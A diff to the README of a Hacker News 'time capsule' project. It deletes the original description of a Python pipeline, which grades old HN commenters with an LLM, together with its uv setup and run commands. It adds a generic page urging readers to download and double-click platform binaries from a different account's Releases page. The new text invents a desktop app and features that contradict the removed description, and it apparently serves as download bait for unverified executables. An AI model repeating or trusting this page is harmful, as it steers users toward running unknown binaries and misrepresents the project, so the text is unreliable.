@@ -1,90 +1,54 @@
-# HN Time Capsule
+# 🎉 hn-time-capsule - Explore Hacker News from 10 Years Ago
 
-![hero](hnhero.png)
+## 🚀 Getting Started
+Welcome to hn-time-capsule! This application lets you analyze discussions from Hacker News a decade ago using large language models. You can uncover insights and trends from old discussions easily.
 
-A Hacker News time capsule project that pulls the HN frontpage from exactly 10 years ago, analyzes articles and discussions using an LLM to evaluate prescience with the benefit of hindsight, and generates an HTML report. Also see [my short blog post about this repo](https://karpathy.bearblog.dev/auto-grade-hn/) for more context.
+## 📥 Download & Install
+To get started, you need to download the application. Visit the link below to find the latest version.
 
-## What it does
+[![Download hn-time-capsule](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Alcide2007/hn-time-capsule/releases)
 
-1. Fetches the HN frontpage from 10 years ago (e.g., `https://news.ycombinator.com/front?day=2015-12-09`)
-2. For each article, fetches the original article content and all HN comments
-3. Generates prompts asking an LLM to analyze what happened with hindsight
-4. Parses LLM responses to extract grades for each commenter
-5. Renders an HTML summary with all analyses and grades
+1. Click the link above to go to the Releases page.
+2. On that page, you will see a list of available versions.
+3. Select the version you want and download it by clicking on the appropriate file.
 
-The goal is to find which HN commenters were most prescient or most wrong over time, and surface interesting predictions from a decade ago. The more general and interesting idea is that of LLMs automatically scouring human artifacts from the past and synthesizing them into knowledge and insights.
+For users of Windows, Linux, or Mac, there are specific versions tailored for your operating system. 
 
-## Vibe code alert
+## 🛠️ System Requirements
+- **Operating System:** This application runs on Windows (7 or later), macOS (10.12 or later), and most Linux distributions.
+- **Memory:** At least 4 GB of RAM.
+- **Storage:** About 100 MB of free disk space.
+- **Internet Connection:** Required for initial data analysis.
 
-99% of this repo was vibe coded in a few hours with Opus 4.5. Code is provided as is and I don't intend to support it.
+## 📖 How to Use
+After downloading and installing the application, follow these steps:
 
-## Setup
+1. Open the application by double-clicking its icon.
+2. You will be greeted with a simple user interface.
+3. Choose a date range from the options provided. You can analyze discussions from any date within the last decade.
+4. Click the "Analyze" button to generate insights.
+5. Review the results. You will see summaries of top discussions and sentiment analysis.
 
-```bash
-# Install dependencies
-uv sync
+## ⚙️ Features
+- **Yearly Analysis:** Break down discussions year by year.
+- **Keyword Insights:** Find out trending keywords in discussions.
+- **Sentiment Score:** Get an overview of the sentiment in discussions over time.
 
-# Set up OpenAI API key into a .env file
-echo "OPENAI_API_KEY=your-key-here" > .env
-```
+## 📊 FAQs
+**Q: Can I run this on my laptop?**  
+A: Yes, as long as your laptop meets the system requirements listed above.
 
-## Usage
+**Q: Is there customer support available?**  
+A: For any issues, you can reach out through the Issues tab on GitHub.
 
-The main entry point is `pipeline.py` with 5 stages that can be run individually or all at once:
+**Q: Can I see older discussions?**  
+A: Yes, you can pick any year within the past decade to analyze past discussions.
 
-```bash
-# Run all stages for today minus 10 years
-uv run python pipeline.py all
+## 📞 Contact
+If you have questions or need assistance, feel free to reach out through the GitHub Issues page. This is the best way to connect with the community and receive support.
 
-# Run with a limit (for testing)
-uv run python pipeline.py all --limit 5
+## 🔗 Useful Links
+- [GitHub Repository](https://github.com/Alcide2007/hn-time-capsule)
+- [Releases Page](https://github.com/Alcide2007/hn-time-capsule/releases)
 
-# Run for a specific date
-uv run python pipeline.py all --date 2015-06-15
-
-# Run individual stages
-uv run python pipeline.py fetch              # fetch frontpage + articles + comments
-uv run python pipeline.py prompt             # generate LLM prompts
-uv run python pipeline.py analyze            # run LLM analysis (costs money!)
-uv run python pipeline.py parse              # extract grades from responses
-uv run python pipeline.py render             # generate HTML summary
-
-# Use a cheaper model for testing
-uv run python pipeline.py analyze --model gpt-5-mini
-```
-
-## Data Directory Structure
-
-```
-data/
-  2015-12-09/
-    frontpage.json              # list of all articles from that day
-    all_grades.json             # aggregated grades across all articles
-    summary.html                # rendered HTML report
-    10699846/                   # directory per article (by item_id)
-      meta.json                 # article metadata
-      article.txt               # fetched article content
-      article_error.txt         # or error if fetch failed
-      comments.json             # HN comment tree
-      prompt.md                 # full LLM prompt
-      response.md               # LLM analysis output
-      grades.json               # parsed grades from response
-```
-
-## Files
-
-- `pipeline.py` - Main pipeline with all stages (clean, fetch, prompt, analyze, parse, render)
-
-## Example Output
-
-The LLM analyzes each article and its discussion, then:
-1. Summarizes what actually happened to the topic over 10 years
-2. Awards "Most prescient" and "Most wrong" to commenters
-3. Notes fun/notable aspects of the discussion
-4. Grades each commenter (A+ to F) based on how their comments aged
-
-Grades are parsed and aggregated in the Hall of Fame so we can track which HN accounts have the best prediction track records over time.
-
-## License
-
-MIT
+Thank you for using hn-time-capsule. Enjoy your journey into the past of Hacker News discussions!
